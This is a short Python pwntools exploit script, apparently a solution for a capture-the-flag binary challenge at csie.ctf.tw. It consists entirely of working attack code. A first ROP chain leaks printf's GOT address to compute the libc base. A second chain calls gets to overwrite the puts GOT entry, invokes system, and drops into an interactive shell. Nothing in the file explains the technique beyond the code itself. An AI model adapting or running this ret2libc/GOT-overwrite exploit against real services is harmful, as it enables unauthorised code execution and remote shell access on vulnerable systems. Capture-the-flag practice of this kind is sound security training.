#!/usr/bin/env python

from pwn import *

main = 0x0804851d
puts_plt = 0x080483c0
printf_plt = 0x080483b0
scanf_plt = 0x08048410

puts_got = 0x0804a010
printf_got = 0x0804a00c

puts_off = 0x65440
gets_off = 0x64ae0
system_off = 0x3fc40
printf_off = 0x4cbb0
scanf_off = 0x54c40

pop1ret = 0x0804839d
pop2ret = 0x0804881e
pop3ret = 0x0804881d
pop4ret = 0x0804881c

def send(s):
    print s
    r.send(s)
    return r.recvrepeat(0.5)

r = remote('csie.ctf.tw', 10115)

mesg = ('-1 -1 ' +
    '1 '*20 + '0 ' +
    '2 3 4 5 6 7 8 ' +
    str(printf_plt) + ' ' + str(main) + ' ' + str(printf_got) + ' ' +
    '12 0 ')

print mesg
recv = send(mesg)
base = u32(recv[-43:-39]) - printf_off
# base = u32(r.recvline()[:4]) - puts_off

print 'libc base =', hex(base)

system = base + system_off
gets = base + gets_off
puts = base + puts_off
printf = base + printf_off
scanf = base + scanf_off

mesg = ('-1 -1 ' +
    '1 '*20 + '0 ' +
    '2 3 4 5 6 ' +
     str(gets) + ' ' + str(system) + ' ' + str(puts_got) + ' ' + str(puts_got) + ' ' +
    '11 12 0 ')
print send(mesg)

r.interactive()

r.close
